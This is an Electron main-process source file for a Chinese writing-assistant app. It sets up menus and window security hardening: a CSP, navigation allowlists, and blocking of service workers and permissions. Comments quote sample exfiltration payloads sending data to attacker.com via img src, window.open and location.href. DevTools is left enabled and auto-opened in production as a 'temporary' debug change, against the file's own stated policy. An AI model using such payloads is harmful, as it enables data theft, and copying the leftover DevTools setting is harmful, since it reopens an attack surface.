// 窗口与菜单创建：CSP 注入、导航拦截、权限拒绝等安全加固。
// 依赖 electron（BrowserWindow/Menu/shell/session）、./shared（setMainWindow）、../logger。
import { BrowserWindow, Menu, shell, session } from 'electron';
import path from 'node:path';
import { logger } from '../logger';
import { setMainWindow } from './shared';

function createMenu() {
  const template: Electron.MenuItemConstructorOptions[] = [
    {
      label: '文件',
      submenu: [
        { label: '新建项目', accelerator: 'CmdOrCtrl+N' },
        { label: '打开项目', accelerator: 'CmdOrCtrl+O' },
        { type: 'separator' },
        { label: '保存', accelerator: 'CmdOrCtrl+S' },
        { label: '另存为', accelerator: 'CmdOrCtrl+Shift+S' },
        { type: 'separator' },
        { label: '导出', submenu: [
          { label: '导出为 Markdown' },
          { label: '导出为 Word' },
          { label: '导出为 PDF' },
          { label: '导出为 TXT' },
        ]},
        { type: 'separator' },
        { label: '退出', accelerator: 'CmdOrCtrl+Q', role: 'quit' },
      ],
    },
    {
      label: '编辑',
      submenu: [
        { label: '撤销', accelerator: 'CmdOrCtrl+Z', role: 'undo' },
        { label: '重做', accelerator: 'CmdOrCtrl+Y', role: 'redo' },
        { type: 'separator' },
        { label: '剪切', accelerator: 'CmdOrCtrl+X', role: 'cut' },
        { label: '复制', accelerator: 'CmdOrCtrl+C', role: 'copy' },
        { label: '粘贴', accelerator: 'CmdOrCtrl+V', role: 'paste' },
        { type: 'separator' },
        { label: '搜索', accelerator: 'CmdOrCtrl+F' },
        { label: '全局搜索', accelerator: 'CmdOrCtrl+K' },
      ],
    },
    {
      label: '视图',
      submenu: [
        { label: '切换全屏', accelerator: 'F11', role: 'togglefullscreen' },
        { type: 'separator' },
        { label: '主题', submenu: [
          { label: '深色模式' },
          { label: '浅色模式' },
        ]},
      ],
    },
    {
      label: '帮助',
      submenu: [
        { label: '使用手册' },
        { label: '关于灵犀写作助手', role: 'about' },
      ],
    },
  ];

  const menu = Menu.buildFromTemplate(template);
  Menu.setApplicationMenu(menu);
}

function createWindow(opts: { devServerUrl?: string; distRenderer: string }): void {
  const { devServerUrl, distRenderer } = opts;
  // 注入 Content-Security-Policy，阻断 XSS → 任意 IPC 调用的攻击链
  const isDev = !!devServerUrl;
  const devOrigin = isDev ? new URL(devServerUrl!).origin : '';
  // connect-src 收窄为已知 AI 服务域名白名单 + 本地 loopback，
  // 不再使用 https: 通配，防止 XSS 后把数据外传到任意 https 端点
  const aiConnectSrc = "'self' https://api.openai.com https://api.deepseek.com http://localhost:* http://127.0.0.1:*";
  const devConnectExtra = isDev ? ` ${devOrigin} ws://localhost:* ws://127.0.0.1:*` : '';
  const csp = [
    "default-src 'self'",
    `script-src 'self'${isDev ? ` 'unsafe-inline' ${devOrigin}` : ''}`,
    "style-src 'self' 'unsafe-inline'",
    // img-src 不允许 https: 通配：防止 XSS 后用 new Image().src='https://attacker.com/?d='
    // 把数据通过 URL query 外泄（CSP connect-src 不拦截 <img> 请求）。
    // 用户附件已通过 file:readDataURL 转为 data: 内嵌，无需 https: 外链
    "img-src 'self' data: blob:",
    "font-src 'self' data:",
    `connect-src ${aiConnectSrc}${devConnectExtra}`,
    "media-src 'self' data: blob:",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
  ].join('; ');
  session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Content-Security-Policy': [csp],
      },
    });
  });

  const mainWindow = new BrowserWindow({
    width: 1440,
    height: 900,
    minWidth: 1024,
    minHeight: 680,
    show: false,
    title: '灵犀写作助手',
    backgroundColor: '#1a1a1a',
    autoHideMenuBar: true,
    titleBarStyle: process.platform === 'darwin' ? 'hiddenInset' : 'default',
    webPreferences: {
      preload: path.join(__dirname, 'preload.cjs'),
      contextIsolation: true,
      nodeIntegration: false,
      // 显式启用 sandbox，限制渲染进程对 Node API 的访问，
      // 即使 preload 出现原型污染也无法直接拿到 require/process
      sandbox: true,
      // 显式声明安全默认值：防止未来 Electron 版本变更默认值引入回归
      // webSecurity: 同源策略 + file:// 协议限制（默认 true，关闭后渲染层可加载任意远程脚本）
      webSecurity: true,
      // allowRunningInsecureContent: 禁止 https 页面混入 http 子资源（默认 false）
      allowRunningInsecureContent: false,
      // experimentalFeatures: 关闭 Chromium 实验性 API（默认 false，开启可能引入未审计的攻击面）
      experimentalFeatures: false,
      // 禁用 enableBlinkFeatures 中可能被滥用的特性
      enableBlinkFeatures: undefined,
      // 禁用 dwfptq 等 webview 通道，强制走 BrowserWindow
      webviewTag: false,
      // 生产环境彻底禁用 DevTools：webPreferences.devTools=false 会让 Electron
      // 不响应 F12 / Ctrl+Shift+I / 菜单项 / webContents.openDevTools，
      // 从源头阻断生产环境用户或攻击者通过控制台执行任意 JS（可读取 store 内存数据、
      // 调用受限 IPC 等）。开发环境保留以便调试
      // ⚠️ 临时打开以排查黑屏问题，排查后改回 isDev
      devTools: true,
    },
  });

  setMainWindow(mainWindow);

  mainWindow.once('ready-to-show', () => {
    mainWindow.show();
  });

  // 窗口关闭后置 null，防止 IPC handler 拿到已销毁的窗口引用调用 dialog/BrowserWindow API
  mainWindow.on('closed', () => {
    setMainWindow(null);
  });

  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    // 仅允许 http/https 协议且仅允许白名单域名走外部浏览器，拒绝 file:/shell:/javascript:/data:
    // 等危险协议与非白名单域名。防止渲染层被 XSS 后构造
    //   window.open('https://attacker.com/?d=' + encodeURIComponent(用户敏感数据))
    // 让系统默认浏览器向 attacker.com 发起带数据的 GET 请求（CSP connect-src 不拦截 window.open
    // → shell.openExternal 这条路径，等于 CSP 被旁路，是最直接的完全数据外传通道）
    try {
      const parsed = new URL(url);
      if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
        logger.audit('security.navigation', 'setWindowOpenHandler blocked: non-http(s) protocol', { protocol: parsed.protocol });
        return { action: 'deny' };
      }
      // 白名单：仅允许已知的官方文档/帮助站点外链。其他 http/https 一律 deny，
      // 不调用 shell.openExternal，避免成为数据外传通道
      const ALLOWED_EXTERNAL_HOSTS = new Set([
        'lingxi-writer.github.io',       // 官方文档站
        'lingxi-writer.com',             // 官网
        'github.com',                    // 项目仓库（Issue 反馈等）
        'lingxi-writer.docs',            // 文档备用域名
      ]);
      if (!ALLOWED_EXTERNAL_HOSTS.has(parsed.hostname)) {
        logger.audit('security.navigation', 'setWindowOpenHandler blocked: non-whitelisted host', { hostname: parsed.hostname });
        return { action: 'deny' };
      }
      shell.openExternal(url);
    } catch {
      logger.audit('security.navigation', 'setWindowOpenHandler blocked: invalid url');
    }
    return { action: 'deny' };
  });

  // ============ 主框架导航拦截（NEW-5 HIGH）============
  // setWindowOpenHandler 仅拦截 window.open / target=_blank，不拦截主框架导航。
  // XSS 后执行 window.location.href = 'https://attacker.com/?d=' + 数据 会绕过 CSP
  // connect-src，把整个渲染进程内存数据通过 URL query 外泄，且攻击者页面接管后可
  // 继续通过 IPC 调用主进程接口。
  // 此处只允许 dev origin（vite 开发服务器）与 file: 协议（生产加载本地 index.html），
  // 其他所有导航一律 preventDefault + 审计日志
  mainWindow.webContents.on('will-navigate', (event, url) => {
    try {
      const parsed = new URL(url);
      // dev 模式允许导航回 vite 开发服务器（HMR reload 会触发 will-navigate）
      if (isDev && parsed.origin === devOrigin) return;
      // 生产模式允许 file: 协议（加载本地打包资源，如跳转到 #anchor）
      if (parsed.protocol === 'file:') return;
      logger.audit('security.navigation', 'will-navigate blocked', { url });
      event.preventDefault();
    } catch {
      // URL 解析失败（畸形 url）：阻止导航 + 审计
      logger.audit('security.navigation', 'will-navigate blocked: invalid url');
      event.preventDefault();
    }
  });

  // ============ Webview 标签兜底拦截（NEW-6 LOW）============
  // 虽然 webPreferences.webviewTag=false 已禁用 <webview>，但作为纵深防御注册
  // will-attach-webview：若未来 webviewTag 被误改回 true，此处仍能阻止 webview 附加
  mainWindow.webContents.on('will-attach-webview', (event) => {
    logger.audit('security.navigation', 'will-attach-webview blocked');
    event.preventDefault();
  });

  // ============ Service Worker 注册拦截（H5）============
  // 桌面应用通过 file://（生产）或 localhost（开发）加载，本身不需要 Service Worker。
  // SW 一旦注册会长期在后台运行：可监听 fetch 事件、缓存任意数据、即使用户关闭窗口
  // 也持续运行。被 XSS 后注册恶意 SW 可成为持久化后门（卸载应用后可能仍残留）。
  // 通过拦截 resourceType==='serviceWorker' 的请求从源头阻断注册路径。
  // 不影响其他资源类型（script/img/xhr 等）的正常加载
  session.defaultSession.webRequest.onBeforeRequest((details, callback) => {
    // Electron 类型定义中 resourceType 联合类型未列出 'serviceWorker'，但运行时会返回该值。
    // 强制 as string 比较避免 TS 误判为"无重叠"，同时保留对实际运行值的判断
    if ((details.resourceType as string) === 'serviceWorker') {
      logger.audit('security.sw', 'Service Worker registration blocked', {
        url: details.url,
      });
      callback({ cancel: true });
      return;
    }
    callback({});
  });

  // ============ 权限请求一律拒绝（H4 防御纵深）============
  // 写作桌面应用不需要任何浏览器权限（camera/microphone/notifications/geolocation/
  // midi/clipboard-read/clipboard-sanitized-write/fullscreen 等）。被 XSS 后构造
  // Notification.requestPermission / navigator.permissions.query / getUserMedia 等
  // 调用，主进程统一拒绝，避免被滥用为弹窗骚扰或嗅探本地设备。
  // - setPermissionRequestHandler：处理渲染层主动发起的权限请求（异步 callback）
  // - setPermissionCheckHandler：同步响应 navigator.permissions.query 等检查（返回 boolean）
  // 两者都需要设置，缺任一都会留下可被探测的口子
  session.defaultSession.setPermissionRequestHandler((_wc, permission, callback) => {
    logger.audit('security.permission', 'Permission request denied', { permission });
    callback(false);
  });
  // setPermissionCheckHandler 不使用任何参数：简化为 () => false 避免未使用参数 lint 错误。
  // 不打日志：permission check 可能被高频调用（如每次 navigator.permissions.query），
  // 与 request 的 audit 配对即可定位异常
  session.defaultSession.setPermissionCheckHandler(() => false);

  if (devServerUrl) {
    mainWindow.loadURL(devServerUrl);
  } else {
    mainWindow.loadFile(path.join(distRenderer, 'index.html'));
  }

  // ⚠️ 临时：排查黑屏问题，启动时自动打开 DevTools
  mainWindow.webContents.on('did-finish-load', () => {
    mainWindow.webContents.openDevTools({ mode: 'detach' });
  });
  // 捕获渲染进程崩溃/无响应事件，便于排查
  mainWindow.webContents.on('render-process-gone', (_e, details) => {
    console.error('[render-process-gone]', details);
  });
  mainWindow.webContents.on('unresponsive', () => {
    console.error('[unresponsive] 渲染进程无响应');
  });
}

export { createMenu, createWindow };
